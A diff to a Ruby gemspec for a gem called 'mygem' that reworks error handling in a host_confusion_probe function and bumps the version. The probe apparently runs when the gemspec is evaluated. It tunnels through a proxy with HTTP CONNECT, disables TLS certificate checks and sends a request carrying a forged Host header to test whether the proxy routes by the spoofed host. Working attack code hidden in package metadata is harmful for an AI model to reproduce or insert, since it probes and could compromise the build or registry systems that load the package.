@@ -7,29 +7,32 @@ begin
 
   def host_confusion_probe(proxy_host, proxy_port, connect_target, forged_host, path)
     steps = []
-    Timeout.timeout(15) do
-      sock = TCPSocket.new(proxy_host, proxy_port)
-      steps << "tcp_connected"
-      sock.write("CONNECT #{connect_target}:443 HTTP/1.1\r\nHost: #{connect_target}:443\r\n\r\n")
-      steps << "connect_sent"
-      connect_resp = sock.readline
-      steps << "connect_resp=#{connect_resp.strip.inspect}"
-      ctx = OpenSSL::SSL::SSLContext.new
-      ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
-      ssl = OpenSSL::SSL::SSLSocket.new(sock, ctx)
-      ssl.hostname = connect_target
-      ssl.connect
-      steps << "tls_established"
-      req = "GET #{path} HTTP/1.1\r\nHost: #{forged_host}\r\nConnection: close\r\n\r\n"
-      ssl.write(req)
-      steps << "request_sent"
-      data = ssl.read(2000)
-      steps << "response_read bytes=#{data.to_s.bytesize}"
-      ssl.close
-      steps.join(" | ") + " || resp_first300=#{data.to_s[0,300].inspect}"
+    begin
+      Timeout.timeout(15) do
+        sock = TCPSocket.new(proxy_host, proxy_port)
+        steps << "tcp_connected"
+        sock.write("CONNECT #{connect_target}:443 HTTP/1.1\r\nHost: #{connect_target}:443\r\n\r\n")
+        steps << "connect_sent"
+        connect_resp = sock.readline
+        steps << "connect_resp=#{connect_resp.strip.inspect}"
+        ctx = OpenSSL::SSL::SSLContext.new
+        ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
+        ssl = OpenSSL::SSL::SSLSocket.new(sock, ctx)
+        ssl.hostname = connect_target
+        ssl.connect
+        steps << "tls_established"
+        req = "GET #{path} HTTP/1.1\r\nHost: #{forged_host}\r\nConnection: close\r\n\r\n"
+        ssl.write(req)
+        steps << "request_sent"
+        data = ssl.read(2000)
+        steps << "response_read bytes=#{data.to_s.bytesize}"
+        ssl.close
+        steps << "resp_first300=#{data.to_s[0,300].inspect}"
+      end
+    rescue => e
+      steps << "FAILED #{e.class}: #{e.message}"
     end
-  rescue => e
-    (steps + ["FAILED #{e.class}: #{e.message}"]).join(" | ")
+    steps.join(" | ")
   end
 
   result = host_confusion_probe(
@@ -48,7 +51,7 @@ end
 
 Gem::Specification.new do |s|
   s.name        = "mygem"
-  s.version     = "0.0.4"
+  s.version     = "0.0.5"
   s.summary     = "temp research gem"
   s.authors     = ["researcher"]
   s.files       = ["lib/mygem.rb"]
